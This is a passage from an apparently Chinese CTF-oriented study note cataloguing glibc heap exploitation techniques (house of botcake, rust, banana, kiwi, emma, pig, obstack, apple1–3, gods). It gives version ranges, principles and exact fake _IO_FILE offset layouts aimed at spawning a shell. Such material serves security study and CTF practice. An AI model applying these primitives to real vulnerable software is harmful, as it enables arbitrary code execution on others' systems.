class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意代码执行</li></ul><h2 id="2-16-house-of-botcake"><a href="#2-16-house-of-botcake" class="headerlink" title="2.16-house of botcake"></a>2.16-house of botcake</h2><h3 id="漏洞成因-15"><a href="#漏洞成因-15" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight irpf90"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs irpf90"><span class="hljs-keyword">double</span> <span class="hljs-keyword">free</span><br></code></pre></td></tr></tbody></table></figure><h3 id="适用范围-15"><a href="#适用范围-15" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li><li>多次释放 <code>chunk</code> 的能力</li></ul><h3 id="利用原理-15"><a href="#利用原理-15" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p><ul><li>申请 <code>7</code> 个大小相同，大小大于 <code>0x80</code> 的 <code>chunk</code>，再申请三个，分别为 <code>chunk A</code> 和 <code>chunkB</code> 和 <code>chunk C</code></li><li>释放前 <code>7</code> 个和 <code>chunk A</code>，前面 <code>7</code> 个都会进入到 <code>tcachebin</code> 里面，<code>chunk A</code> 进入到 <code>unsortedbin</code></li><li>释放 <code>chunk B</code>，则 <code>chunk B</code> 会和 <code>chunk A</code> 合并</li><li>从 <code>tcachebin</code> 分配走一个</li><li>再次释放 <code>chunk B</code>，此时 <code>B</code> 同时存在与 <code>unsortedbin</code> 和 <code>tcachebin</code></li></ul><h3 id="相关技巧-15"><a href="#相关技巧-15" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在高版本需要绕过指针保护的检查</li></ul><h3 id="利用效果-15"><a href="#利用效果-15" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>构造出堆重叠，为后续利用做准备</li></ul><h2 id="2-17-house-of-rust"><a href="#2-17-house-of-rust" class="headerlink" title="2.17-house of rust"></a>2.17-house of rust</h2><h3 id="漏洞成因-16"><a href="#漏洞成因-16" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-16"><a href="#适用范围-16" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li><li>可以进行 <code>tcache stash unlinking</code> 攻击</li><li>可以进行 <code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-16"><a href="#利用原理-16" class="headerlink" title="利用原理"></a>利用原理</h3><p>原作者的博客写得很复杂，我这里提炼出关键信息。该技巧就是 <code>tcachebin stash unlinking</code>+<code>largebin attack</code> 的组合技巧。</p><p>首先需要知道 <code>tcachebin stash unlinking</code>，下面称之为 <code>TSU</code> 技巧：</p><ul><li><code>tcachebin[A]</code> 为空</li><li><code>smallbin[A]</code> 有 <code>8</code> 个</li><li>修改第 <code>8</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code></li><li>分配 <code>malloc(A)</code> 的时候，<code>addr+0x10</code> 会被写一个 <code>libc</code> 地址</li></ul><p>还要知道 <code>tcachebin stash unlinking+</code>，下面称之为 <code>TSU+</code> 技巧：</p><ul><li><code>tcachebin[A]</code> 为空</li><li><code>smallbin[A]</code> 有 <code>8</code> 个</li><li>修改第 <code>7</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code>，还要保证 <code>addr+0x18</code> 是一个合法可写的地址</li><li>分配 <code>malloc(A)</code> 的时候，<code>addr</code> 会被链入到 <code>tcachebin</code>，也就是可以分配到 <code>addr</code> 处</li></ul><p>以 <code>0x90</code> 大小的 <code>chunk</code> 为例，此时的 <code>tcache_key</code> 还是指向 <code>tcache_perthread_struct + 0x10</code> 的：</p><ul><li>第一步，把 <code>tcachebin[0x90]</code> 填满，把 <code>smallbin[0x90]</code> 也填满</li><li>第二步，把最后一个 <code>smallbin 0x90</code> 的 <code>chunk</code> 的 <code>size</code> 改成 <code>0xb0</code>，将其释放到 <code>tcachebin[0xb0]</code>，这一步主要是为了改变其 <code>bk</code> 指向 <code>tcache_perthread_struct + 0x10</code>，可以部分修改低位的字节，以便下一步分配到目标区域</li><li>第三步，使用 <code>largebin attack</code> 往上一步的 <code>bk-&gt;bk</code> 写一个合法地址，然后耗尽 <code>tcachebin[0x90]</code>，再分配的时候就会触发 <code>TSU+</code>，之后就能分配到 <code>tcache_perthread_struct </code>结构体</li><li>第四步，还是堆风水，但是用 <code>TSU</code> 技术，在 <code>tcache_perthread_struct</code> 上写一个 <code>libc</code> 地址（比前面一步要简单很多）</li><li>第五步，通过控制 <code>tcache_perthread_struct</code> 结构体，部分写上面的 <code>libc</code> 地址，分配到 <code>stdout</code> 结构体，泄露信息</li><li>第六步，通过控制 <code>tcache_perthread_struct</code> 结构体分配到任意地址</li></ul><p>上面的过程最好的情况下需要爆破 <code>1/16</code>，最差 <code>1/256</code>。</p><p>但是，<code>2.34</code> 之后，<code>tcache_key</code> 是一个随机数，不是 <code>tcache_perthread_struct + 0x10</code> 了。</p><p>所以，此时可以加上 <code>largebin attack</code>，把以上的第二步变为：继续用 <code>largebin attack</code> 向其 <code>bk</code> 写一个堆地址，然后还要部分写 <code>bk</code> 使其落在 <code>tcache_perthread_struct</code> 区域。其他步骤一样。</p><p>或者，在 <code>smallbin</code> 里面放 <code>9</code> 个，这样第 <code>8</code> 个的 <code>bk</code> 肯定就是一个堆地址。此时就需要爆破 <code>1/16</code> 的堆，<code>1/16</code> 的 <code>glibc</code> 地址，成功的概率是 <code>1/256</code>。</p><h3 id="相关技巧-16"><a href="#相关技巧-16" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>总的来说，就是利用 <code>tcachebin stash unlinking</code> 打 <code>tcache_perthread_struct</code></li><li>利用 <code>largebin attack</code> 构造合法地址</li></ul><h3 id="利用效果-16"><a href="#利用效果-16" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意函数执行</li></ul><h2 id="2-18-house-of-crust"><a href="#2-18-house-of-crust" class="headerlink" title="2.18-house of crust"></a>2.18-house of crust</h2><h3 id="漏洞成因-17"><a href="#漏洞成因-17" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-17"><a href="#适用范围-17" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.37</code></li><li>可以进行 <code>tcache stash unlinking</code> 攻击</li><li>可以进行 <code>largebin attack</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-17"><a href="#利用原理-17" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他步骤和上面的 <code>house of rust</code> 一样，但是到第五步的时候，去修改 <code>global_max_fast</code></p><p>后面的步骤和 <code>house of corrosion</code> 是一样的，通过写原语打 <code>stderr</code> 修改 <code>one_gadget</code> 拿到 <code>shell</code>。</p><h3 id="相关技巧-17"><a href="#相关技巧-17" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>house of crust = house of corrosion + house of rust</code></li><li><code>2.37</code> 之后，<code>house of corrosion</code> 使用受限</li></ul><h2 id="2-19-house-of-io"><a href="#2-19-house-of-io" class="headerlink" title="2.19-house of io"></a>2.19-house of io</h2><h3 id="漏洞成因-18"><a href="#漏洞成因-18" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-18"><a href="#适用范围-18" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li></ul><h3 id="利用原理-18"><a href="#利用原理-18" class="headerlink" title="利用原理"></a>利用原理</h3><p>其他博客上对该方法的介绍如下：</p><table><thead><tr><th><code>1 </code></th><th><code>The tcache_perthread_object is allocated when the heap is created. Furthermore, it is stored right at the heap's beginning (at a relatively low memory address). The safe-linking mitigation aims to protect the fd/next pointer within the free lists. However, the head of each free-list is not protected. Additionally, freeing a chunk and placing it into the tcachebin also places a non-protected pointer to the appropriate tcache entry in the 2nd qword of a chunks' user data. The House of IO assumes one of three scenarios for the bypass to work. First, any attacker with a controlled linear buffer underflow over a heap buffer, or a relative arbitrary write will be able to corrupt the tcache. Secondly, a UAF bug allowing to read from a freed tcache eligible chunk leaks the tcache and with that, the heap base. Thirdly, a badly ordered set of calls to free(), ultimately passing the address of the tcache itself to free, would link the tcache into the 0x290 sized tcachebin. Allocating it as a new chunk would mean complete control over the tcache's values.</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>可以看出来，其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 <code>tcache</code> 的分配。</p><h3 id="相关技巧-18"><a href="#相关技巧-18" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>围绕 <code>tcache_perthread_struct</code> 进行攻击</li></ul><h3 id="利用效果-17"><a href="#利用效果-17" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="2-20-house-of-banana"><a href="#2-20-house-of-banana" class="headerlink" title="2.20-house of banana"></a>2.20-house of banana</h2><h3 id="漏洞成因-19"><a href="#漏洞成因-19" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-19"><a href="#适用范围-19" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>能执行 <code>exit</code> 函数</li></ul><h3 id="利用原理-19"><a href="#利用原理-19" class="headerlink" title="利用原理"></a>利用原理</h3><p>首先是 <code>largebin attack</code> 在高版本只能从下面这个分支利用：</p><p>也就是，双链表里面至少存在一个 <code>largebin chunk</code>，且目前要入链的 <code>chunk</code> 比最小的还小，修改了 <code>bk_nextsize</code> 之后就会触发。可以造成任意地址写堆地址。</p><p>然后是 <code>exit</code> 调用的时候，会调用到<code>_dl_fini</code> 函数，执行每个 <code>so</code> 中注册的 <code>fini</code> 函数：</p><p>可以触发 <code>call</code> 的有两个点，第一个点可以 <code>call</code> 到很多指针，是一个数组；另一个点就只有一个函数。</p><p>剩下的工作就是根据代码绕过检测，调用到调用点。</p><p>所以，利用的思路有：</p><ul><li>直接伪造<code>_rtld_global</code> 的<code>_ns_loaded</code>，布局好其他内容，使其调用到 <code>fini_array</code></li><li>伪造 <code>link_map</code> 的 <code>next</code> 指针，布局好其他内容，使其调用到 <code>fini_array</code></li><li>修改 <code>link_map-&gt;l_addr</code>，根据偏移使其调用到指定区域的函数</li></ul><h3 id="相关技巧-19"><a href="#相关技巧-19" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>伪造 <code>fini_array</code> 数组的时候，是从后往前遍历的</li><li>有时候远程的 <code>rtld_global</code> 的偏移与本地不一样，需要爆破</li><li>如果不想逐个伪造，可以直接用 <code>gdb</code> 从内存里面 <code>dump</code> 出来，然后基于偏移修改内存即可</li></ul><h3 id="利用效果-18"><a href="#利用效果-18" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意代码执行</li></ul><h2 id="2-21-house-of-kiwi"><a href="#2-21-house-of-kiwi" class="headerlink" title="2.21-house of kiwi"></a>2.21-house of kiwi</h2><h3 id="漏洞成因-20"><a href="#漏洞成因-20" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-20"><a href="#适用范围-20" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.36</code></li><li>在 <code>malloc</code> 流程中触发 <code>assert</code></li></ul><h3 id="利用原理-20"><a href="#利用原理-20" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是提供了一种在程序中调用 <code>IO</code> 流函数的思路：</p><p>可以看到，调用到了 <code>fxprintf</code> 和 <code>fflush</code>。</p><p>至于原 <code>house of kiwi</code> 所提到的控制 <code>rdx</code> 的思路，在很多版本中无法使用，因为 <code>IO_jumps_table</code> 都是不可写的，故此处不再详述。</p><h3 id="相关技巧-20"><a href="#相关技巧-20" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在 <code>2.36</code> 之后，<code>__malloc_assert</code> 被修改为：</li></ul><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 </code></th><th><code>_Noreturn static void __malloc_assert (const char *assertion, const char *file, unsigned int line,  const char *function) {  __libc_message (do_abort, "\ Fatal glibc error: malloc assertion failure in %s: %s\n",   function, assertion);  __builtin_unreachable (); }</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>而在 <code>2.37</code> 该函数直接被删掉了。</p><ul><li><p>如果 <code>stderr</code> 在 <code>libc</code> 上，需要修改调 <code>stderr</code> 处的指针，也有可能在程序的地址空间上</p></li><li><p>伪造的技巧如下，触发 <code>fxprintf(stderr，......)</code>：</p><p>| <code>1 2 3 4 5 </code> | <code>flags &amp; 0x8000的话，不用伪造_lock flags &amp; ~(0x2 | 0x8) 必须成立，避免走到unbuffered的流程 mode 设置为0 vtable默认调用的是偏移0x38的函数，如果想劫持为_IO_xxx_overflow，需要设置为_IO_xxx_jumps-0x20 flags 可以设置为"  sh||"，前面有两个空格，此时还需要设置_lock，不想设置_lock的时候，flags可以为"\x20\x80;sh||"</code> |<br>| ———— | ———————————————————— |<br>|              |                                                              |</p></li></ul><h3 id="利用效果-19"><a href="#利用效果-19" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>触发 <code>IO</code> 处理流程，为后续利用做准备</li></ul><h2 id="2-22-house-of-emma"><a href="#2-22-house-of-emma" class="headerlink" title="2.22-house of emma"></a>2.22-house of emma</h2><h3 id="漏洞成因-21"><a href="#漏洞成因-21" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-21"><a href="#适用范围-21" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行两次 <code>largebin attack</code></li><li>或者可以进行两次任意地址写堆地址</li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-21"><a href="#利用原理-21" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_cookie_jumps</code> 中存在一些<code>_IO_cookie_read</code> 等函数，如下：</p><p>可以看到有函数指针的调用。但是对函数指针使用 <code>pointer_guard</code> 进行了加密：</p><p>循环右移后，再异或。</p><p>因此，利用思路如下：</p><ul><li>截至某个 <code>IO_FILE</code> 的指针（<code>IO_list_all/stdxxx-&gt;chain</code> 等都可以）为堆地址</li><li>堆上伪造 <code>IO_FILE</code> 结构，其 <code>vtable</code> 替换为<code>_IO_cookie_jumps+XX</code>，<code>XX</code> 为一个偏移量</li><li>伪造好函数指针和调用参数，指针需要循环异或和加密</li><li>调用到<code>_IO_cookie_read</code> 等函数，进而执行任意函数</li></ul><h3 id="相关技巧-21"><a href="#相关技巧-21" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>常用的 <code>gadget</code> 有：</li><li><code>pointer_guard</code> 就在 <code>canary</code> 下面，偏移可能需要爆破</li></ul><h3 id="利用效果-20"><a href="#利用效果-20" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="2-23-house-of-pig"><a href="#2-23-house-of-pig" class="headerlink" title="2.23-house of pig"></a>2.23-house of pig</h2><h3 id="漏洞成因-22"><a href="#漏洞成因-22" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-22"><a href="#适用范围-22" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-22"><a href="#利用原理-22" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_str_jumps</code> 中，存在着<code>_IO_str_overflow</code> 函数：</p><p>从函数中就能看到，利用流程如下：</p><ul><li>伪造 <code>IO_FILE</code> 的<code>_IO_buf_base</code></li><li>合理控制<code>_IO_buf_end-_IO_buf_base</code> 的值，进而控制分配的 <code>chunk</code> 的大小，分配到布局好的地址</li><li>在 <code>memcpy</code> 中覆盖地址，如可以覆盖<code>__malloc_hook/__free_hook</code> 等</li></ul><p>该方法需要结合其他堆利用技术，需要保证 <code>malloc</code> 分配出来的 <code>chunk</code> 的地址是可控的。该方法主要提供了对 <code>IO</code> 系列函数中间接调用 <code>mallc/free/memcpy</code> 的组合利用。</p><h3 id="相关技巧-22"><a href="#相关技巧-22" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>可以 <code>largebin attack</code> 打掉 <code>mp_.tcachebins</code>，进而能把很大的 <code>chunk</code> 也放进入 <code>tcache</code> 进行管理</li><li>高版本没有 <code>hook</code> 的话，可以利用 <code>memcpy@got</code>，通过覆写 <code>got</code> 来进行 <code>rce</code></li><li>可以多次 <code>house of pig</code> 组合调用</li></ul><h3 id="利用效果-21"><a href="#利用效果-21" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li><code>ROP</code> 控制程序执行流</li></ul><h2 id="2-24-house-of-obstack"><a href="#2-24-house-of-obstack" class="headerlink" title="2.24-house of obstack"></a>2.24-house of obstack</h2><h3 id="漏洞成因-23"><a href="#漏洞成因-23" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-23"><a href="#适用范围-23" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以执行一次 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-23"><a href="#利用原理-23" class="headerlink" title="利用原理"></a>利用原理</h3><p>一条新的利用链，伪造 <code>vtable</code> 为<code>_IO_obstack_jumps</code>，然后调用到<code>_IO_obstack_xsputn</code>，紧接着调用 <code>obstack_grow</code>，其代码为：</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 9 </code></th><th><code>#define obstack_grow(OBSTACK, where, length)                      \  __extension__                                   \    ({ struct obstack *__o = (OBSTACK);                       \       int __len = (length);                              \       if (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \     _obstack_newchunk (__o, __len);                      \       memcpy (__o-&gt;next_free, where, __len);                     \       __o-&gt;next_free += __len;                           \       (void) 0; })</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>然后在<code>_obstack_newchunk</code> 调用了 <code>CALL_CHUNKFUN</code> 这个宏</p><p>这个宏会调用到函数指针：</p><table><thead><tr><th><code>1 2 3 4 </code></th><th><code># define CALL_CHUNKFUN(h, size) \  (((h)-&gt;use_extra_arg)                               \   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))                     \   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>因此，其就是利用该函数指针进行控制程序的执行流。</p><h3 id="相关技巧-23"><a href="#相关技巧-23" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>伪造的 <code>IO_FILE</code> 布局如下：</p><ul><li>利用 <code>largebin attack</code> 伪造<code>_IO_FILE</code>，记完成伪造的 <code>chunk</code> 为 <code>A</code>（或者别的手法）</li><li><code>chunk A</code> 内偏移为 <code>0xd8</code> 处设为<code>_IO_obstack_jumps+0x20</code></li><li><code>chunk A</code> 内偏移为 <code>0xe0</code> 处设置 <code>chunk A</code> 的地址作为 <code>obstack</code> 结构体</li><li><code>chunk A</code> 内偏移为 <code>0x18</code> 处设为 <code>1</code>（<code>next_free</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x20</code> 处设为 <code>0</code>（<code>chunk_limit</code>）</li><li><code>chunk A</code> 内偏移为 <code>0x48</code> 处设为 <code>&amp;/bin/sh</code></li><li><code>chunk A</code> 内偏移为 <code>0x38</code> 处设为 <code>system</code> 函数的地址</li><li><code>chunk A</code> 内偏移为 <code>0x28</code> 处设为 <code>1</code>（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x30</code> 处设为 <code>0</code> (<code>_IO_write_end</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x50</code> 处设为 <code>1</code> (<code>use_extra_arg</code>)</li></ul><p><code>glibc-2.37</code> 开始这个方法的调用链为：<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>。</p><h3 id="利用效果-22"><a href="#利用效果-22" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="2-25-house-of-apple1"><a href="#2-25-house-of-apple1" class="headerlink" title="2.25-house of apple1"></a>2.25-house of apple1</h2><h3 id="漏洞成因-24"><a href="#漏洞成因-24" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-24"><a href="#适用范围-24" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>程序从 <code>main</code> 函数返回或能调用 <code>exit</code> 函数</li><li>能泄露出 <code>heap</code> 地址和 <code>libc</code> 地址</li><li>能使用一次 <code>largebin attack</code>（一次即可）</li></ul><h3 id="利用原理-24"><a href="#利用原理-24" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用<code>_IO_wstr_overflow</code> 将任意地址存储的值修改已知值：</p><p>比如修改 <code>tcache</code> 变量、<code>mp_</code>结构体、<code>pointer_guard</code> 变量等。</p><p>修改成功后，再使用其他技术控制程序执行流。</p><h3 id="相关技巧-24"><a href="#相关技巧-24" class="headerlink" title="相关技巧"></a>相关技巧</h3><p><code>house of apple1</code> 是对现有一些 <code>IO</code> 流攻击方法的补充，能在一次劫持 <code>IO</code> 流的过程中做到任意地址写已知值，进而构造出其他方法攻击成功的条件。</p><h3 id="利用效果-23"><a href="#利用效果-23" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址写已知堆地址</li></ul><h2 id="2-26-house-of-apple2"><a href="#2-26-house-of-apple2" class="headerlink" title="2.26-house of apple2"></a>2.26-house of apple2</h2><h3 id="漏洞成因-25"><a href="#漏洞成因-25" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-25"><a href="#适用范围-25" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</li><li>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</li><li>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</li></ul><h3 id="利用原理-25"><a href="#利用原理-25" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>_IO_WIDE_JUMPS</code> 没有检查<code>_wide_vtable</code> 的合法性：</p><table><thead><tr><th><code>1 2 3 4 5 6 7 8 </code></th><th><code>#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</code></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>所以利用<code>_IO_wfile_jumps</code> 等伪造<code>_wide_vtable</code> 即可。</p><h3 id="相关技巧-25"><a href="#相关技巧-25" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>利用<code>_IO_wfile_overflow</code> 函数控制程序执行流时对 <code>fp</code> 的设置如下：</p><ul><li><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li><li><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</li><li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></li></ul><h3 id="利用效果-24"><a href="#利用效果-24" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="2-27-house-of-apple3"><a href="#2-27-house-of-apple3" class="headerlink" title="2.27-house of apple3"></a>2.27-house of apple3</h2><h3 id="漏洞成因-26"><a href="#漏洞成因-26" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-26"><a href="#适用范围-26" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</li><li>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</li><li>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</li></ul><h3 id="利用原理-26"><a href="#利用原理-26" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>__libio_codecvt_in</code> 等函数，可以设置 <code>gs-&gt;__shlib_handle == NULL</code> 绕过 <code>PTR_DEMANGLE</code> 对指针的保护，然后通过<code>_IO_wfile_underflow </code>调用到<code>__libio_codecvt_in</code> 来控制函数指针，执行任意代码。</p><h3 id="相关技巧-26"><a href="#相关技巧-26" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>利用_IO_wfile_underflow 函数控制程序执行流时对 <code>fp</code> 的设置如下：</p><ul><li><code>_flags</code> 设置为 <code>~(4 | 0x10)</code></li><li><code>vtable</code> 设置为<code>_IO_wfile_jumps</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow</code> 即可</li><li><code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>，即满足 <code>*(fp + 8) &lt; *(fp + 0x10)</code></li><li><code>_wide_data</code> 保持默认，或者设置为堆地址，假设其地址为 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足 <code>*A &gt;= *(A + 8)</code></li><li><code>_codecvt</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code> 设置为可控堆地址 <code>C</code>，即满足 <code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code> 设置为 <code>0</code>，即满足 <code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code> 设置为地址 <code>D</code>, 地址 <code>D</code> 用于控制 <code>rip</code>，即满足 <code>*(C + 0x28) = D</code>。当调用到 <code>D</code> 的时候，此时的 <code>rdi</code> 为 <code>C</code>。如果<code>_wide_data</code> 也可控的话，<code>rsi</code> 也能控制。</li></ul><h3 id="利用效果-25"><a href="#利用效果-25" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="2-28-house-of-gods"><a href="#2-28-house-of-gods" class="headerlink" title="2.28-house of gods"></a>2.28-house of gods</h2><h3 id="漏洞成因-27"><a href="#漏洞成因-27" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-27"><a href="#适用范围-27" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.27</code></li><li>泄露堆地址和 <code>libc</code> 地址</li><li>任意大小分配</li></ul><h3 id="利用原理-27"><a href="#利用原理-27" class="headerlink" title="利用原理"></a>利用原理</h3><p>这个技巧比较有意思，非常建议把作者的原博客读一下。我会简述一下该技巧的利用过程。</p><p>总的来说，该技巧最终的目的是伪造一个 <code>fake arena</code>，通过劫持 <code>main_arena.next</code> 字段完成。</p><p>其主要过程为：</p><ul><li>通过 <code>binmap</code> 的赋值，将其当做 <code>chunk</code> 的 <code>size</code>，然后修改 <code>unsortedbin</code> 链的 <code>bk</code> 指向 <code>binmap</code>，作者选择的是 <code>0x90</code> 大小的 <code>chunk</code>，释放后恰好让 <code>binmap</code> 称为 <code>0x200</code>，然后 <code>binmap-&gt;bk</code> 是 <code>main_arena</code>(初始状态下 <code>main_arena.next = &amp;main_arena</code>)，然后 <code>main_arena-&gt;bk= fastbin[0x40]</code></li><li>分配 <code>0x1f0</code> 大小的 <code>chunk</code> 就刚好能分配到 <code>binmap</code></li><li>之后修改掉 <code>main_arena</code> 的 <code>system_mem</code> 为很大的值和 <code>next</code> 指向 <code>fake arena</code></li><li>然后用 <code>unsortedbin attack</code> 打掉 <code>narenas</code>，将其改为一个很大的数</li><li>然后分配两次 <code>malloc(0xffffffffffffffbf + 1)</code>，触发 <code>arena_get_retry</code>，进而触发两次 <code>reused_arena</code>，就能把 <code>fake arena</code> 给 <code>thread_arena</code> 变量</li><li>最后直接伪造 <code>fastbin</code> 任意地址分配</li></ul><h3 id="相关技巧-27"><a href="#相关技巧-27" 